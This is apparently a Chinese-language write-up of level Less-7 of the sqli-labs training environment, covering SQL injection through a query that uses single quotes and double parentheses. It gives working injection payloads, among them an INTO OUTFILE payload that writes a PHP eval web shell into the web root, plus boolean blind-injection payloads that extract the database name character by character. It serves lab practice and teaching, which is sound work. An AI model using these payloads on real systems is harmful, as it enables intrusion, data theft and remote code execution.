# Less-7

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 导出文件 |
| **闭合方式** | `'))` |
| **成败信号** | You are in / 伪造的报错 |
| **一句话** | 本环境 outfile 被禁，改用盲注 |
| **核心 payload** | `?id=1')) and length(database())=8--+` |

---

**GET · 导出文件 · 单引号 + 双括号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
                                   ↑↑        ↑↑
                                 两层括号
if($row) { echo 'You are in.... Use outfile......'; }
else     { echo 'You have an error in your SQL syntax'; }   // ← 这是假的报错，别被骗
```

### 判断闭合方式

```
?id=1'      →  You have an error in your SQL syntax
?id=1')) --+ →  You are in.... Use outfile......
```
闭合是 **`'))`**（两个右括号 + 一个引号）。

### ⚠️ 这关原本是写文件，但本环境写不了

原版思路是把一句话木马 `INTO OUTFILE` 写到网站目录：

```
?id=-1')) union select 1,2,'<?php @eval($_POST[1]);?>' into outfile 'E:/phpstudy/phpstudy_pro/WWW/sqli-labs-master/shell.php'--+
```

**实测：文件没有生成。** 原因是本环境 `@@secure_file_priv = NULL`：

```
?id=-1' union select 1,@@secure_file_priv,@@datadir--+
→  user=NULL   pass=E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\data\
```

`secure_file_priv` 的三种取值：

| 值 | 含义 |
|---|---|
| `NULL` | **完全禁止**文件导入导出 ← 本环境 |
| 空字符串 | 允许任意路径（最危险） |
| 某个目录 | 只允许该目录 |

想要开启，改 `my.ini` 里的 `secure_file_priv`（留空或写目录），重启 MySQL 即可。**但日常用不到就别开**，这是很重要的安全配置。

### 替代打法：当布尔盲注用（实测有效）

既然 `else` 分支会输出一句假报错，那就用它当真/假信号：

```
?id=1')) and length(database())=8--+   →  You are in.... （真）
?id=1')) and length(database())=9--+   →  You have an error in your SQL syntax （假）
```
→ 库名长度 = 8（`security`）

接着逐字符爆破：

```
?id=1')) and substr(database(),1,1)='s'--+
?id=1')) and ascii(substr(database(),1,1))=115--+
```

---

[← Less-6](Less-06.md) ｜ [返回目录](README.md) ｜ [Less-8 →](Less-08.md)